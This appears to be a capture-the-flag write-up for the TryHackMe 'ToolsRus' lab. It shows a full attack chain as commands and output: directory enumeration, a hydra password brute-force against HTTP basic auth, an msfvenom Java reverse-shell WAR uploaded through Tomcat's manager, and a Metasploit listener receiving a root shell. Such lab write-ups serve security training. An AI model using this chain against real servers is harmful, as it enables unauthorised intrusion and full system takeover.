# Target
| Category          | Details                                         |
|-------------------|-------------------------------------------------|
| 📝 **Name**       | [ToolsRus](https://tryhackme.com/room/toolsrus) |  
| 🏷 **Type**       | THM Challenge                                   |
| 🖥 **OS**         | Linux                                           |
| 🎯 **Difficulty** | Easy                                            |
| 📁 **Tags**       | Web enumeration, hydra, Tomcat 7                |

# Scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:eb:d5:93:ad:53:ec:a8:64:d4:66:07:46:d3:8c:47 (RSA)
|   256 df:f6:69:18:dc:b8:11:7f:85:5a:03:b2:df:06:ea:aa (ECDSA)
|_  256 95:5a:98:46:de:36:44:15:40:b8:d0:87:a2:ec:4b:ae (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Discover credentials for user `bob` using dictionary attack](#discover-credentials-for-user-bob-using-dictionary-attack)
2. [Gain foothold by deploying `.war` archive with reverse shell](#gain-foothold-by-deploying-war-archive-with-reverse-shell)

### Discover credentials for user `bob` using dictionary attack

#### Enumerate web application
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ feroxbuster --url http://10.82.129.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<SNIP>
301      GET        9l       28w      319c http://10.82.129.198/guidelines => http://10.82.129.198/guidelines/
401      GET       14l       54w      460c http://10.82.129.198/protected
<SNIP>
```

#### Discover `bob` as potential username
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ curl http://$TARGET/guidelines/
Hey <b>bob</b>, did you update that TomCat server?
```

#### Discover `/protected` is protected with HTTP basic authentication
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ curl -I http://$TARGET/protected
HTTP/1.1 401 Unauthorized
Date: Thu, 04 Dec 2025 15:43:08 GMT
Server: Apache/2.4.18 (Ubuntu)
WWW-Authenticate: Basic realm="protected"
Content-Type: text/html; charset=iso-8859-1
```

#### Use `hydra` to conduct dictionary attack against user `bob`
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ hydra -I -l bob -P /usr/share/wordlists/rockyou.txt http-get://$TARGET/protected
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-04 16:39:19
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking http-get://10.82.129.198:80/protected
[80][http-get] host: 10.82.129.198   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-04 16:39:22
```

### Gain foothold by deploying `.war` archive with reverse shell

#### Generate `java/shell_reverse_tcp` in form of `.war` file
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war
Payload size: 13034 bytes
Final size of war file: 13034 bytes
Saved as: shell.war
```

#### Deploy `shell.war` reverse shell using `/manager/html`
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ CSRF_NONCE=$(curl -s -c cookies.txt -u bob:bubbles "http://$TARGET:1234/manager/html" | grep -oP "CSRF_NONCE=\K[^\"]+" -m 1) && \
curl -s -b cookies.txt -u bob:bubbles "http://$TARGET:1234/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF_NONCE" -F "deployWar=@shell.war" -o /dev/null
```

#### Start `msfconsole` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload java/shell_reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => java/shell_reverse_tcp
[*] Started reverse TCP handler on 192.168.132.170:4444
```

#### Access `/shell` Java application to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ curl http://$TARGET:1234/shell 
```

#### Confirm foothold gained
```
┌──(magicrc㉿perun)-[~/attack/THM ToolsRus]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload java/shell_reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => java/shell_reverse_tcp
[*] Started reverse TCP handler on 192.168.132.170:4444 
[*] Command shell session 1 opened (192.168.132.170:4444 -> 10.80.168.229:50572) at 2025-12-04 18:54:29 +0100

id    
uid=0(root) gid=0(root) groups=0(root)
```
It seems that Tomcat is running as `root` user and thus no further escalation is needed.